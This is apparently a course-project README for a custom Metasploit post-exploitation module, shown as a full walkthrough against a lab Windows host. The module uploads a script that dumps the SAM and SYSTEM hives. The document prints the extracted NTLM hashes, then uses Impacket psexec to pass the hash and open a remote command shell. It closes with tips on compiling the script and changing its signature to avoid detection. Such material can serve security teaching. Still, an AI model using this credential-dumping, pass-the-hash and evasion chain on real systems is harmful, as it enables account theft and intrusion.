# Steps

Clone the repo to your root home folder

``` sh
> sudo su
> git clone link ~/.msf4/modules/post/ece509
```

This lets metasploit framework find the module.

``` sh
sudo msfconsole
# this is a contrived stand-in for some exploit that has already obtained a shell
use scanner/ssh/ssh_login
set USERNAME user
set PASSWORD ece
set RHOSTS 10.0.2.4
run # should connect. Use whatever method to get a shell that's suitable for you. Type 'sessions' to see your shell session
[*] Using post/ece509/exploit
msf6 post(ece509/exploit) > set SESSION 1
SESSION => 1
msf6 post(ece509/exploit) > creds
Credentials
===========

host      origin    service       public  private  realm  private_type  JtR Format
----      ------    -------       ------  -------  -----  ------------  ----------
10.0.2.4  10.0.2.4  22/tcp (ssh)  user    ece             Password      

msf6 post(ece509/exploit) > run

[!] SESSION may not be compatible with this module.
[*] Sending /root/.msf4/modules/post/ece509/get_sam.py to C:\Users\user\get_sam.py.
[*] Executing get_sam.py on the remote.
[*] Found SAM hive.
[*] Found SYSTEM hive.
[*] Found user:ntlm_hash pair: Administrator : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Found user:ntlm_hash pair: Guest : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Found user:ntlm_hash pair: DefaultAccount : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[*] Found user:ntlm_hash pair: WDAGUtilityAccount : aad3b435b51404eeaad3b435b51404ee:752522b2bf257e37d30520cb342cbdaf
[*] Found user:ntlm_hash pair: ece509 : aad3b435b51404eeaad3b435b51404ee:c60a0b9eee38c397884cdcfa33f54e30
[*] Post module execution completed
msf6 post(ece509/exploit) > creds
Credentials
===========

host      origin    service       public              private                                                            realm  private_type  JtR Format
----      ------    -------       ------              -------                                                            -----  ------------  ----------
          10.0.2.4                ece509              aad3b435b51404eeaad3b435b51404ee:c60a0b9eee38c397884cdcfa33f54e30         NTLM hash     nt,lm
          10.0.2.4                WDAGUtilityAccount  aad3b435b51404eeaad3b435b51404ee:752522b2bf257e37d30520cb342cbdaf         NTLM hash     nt,lm
          10.0.2.4                DefaultAccount      aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
          10.0.2.4                Guest               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
          10.0.2.4                Administrator       aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
10.0.2.4  10.0.2.4  22/tcp (ssh)  user                ece                                                                       Password      

msf6 post(ece509/exploit) >
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c60a0b9eee38c397884cdcfa33f54e30 ece509@10.0.2.4 "C:\\Windows\\system32\\cmd.exe"
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.0.2.4.....
[*] Found writable share ADMIN$
[*] Uploading file lcDdeOqb.exe
[*] Opening SVCManager on 10.0.2.4.....
[*] Creating service lpxn on 10.0.2.4.....
[*] Starting service lpxn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

If your target doesn't have python installed, you can create an executable with access to a Windows machine:
```
C:\Users\user\Desktop\WPy64-3980\python-3.9.8.amd64\python.exe
> python.exe setup.py py2exe -b 0
```
**Note** you may also need to package VCRUNTIMExxx.dll. It's possible the setup.py script could be tweaked to borrow your system's VCRUNTIME DLL. Maybe setup.py could also inject noisy functions into get_sam.py prior to compilation to change the executable's signature and avoid detection. This would be better served by recompiling a variant of the HiveNightmare.exe program.

Alternatively you could upload a python distribution, but that's massive.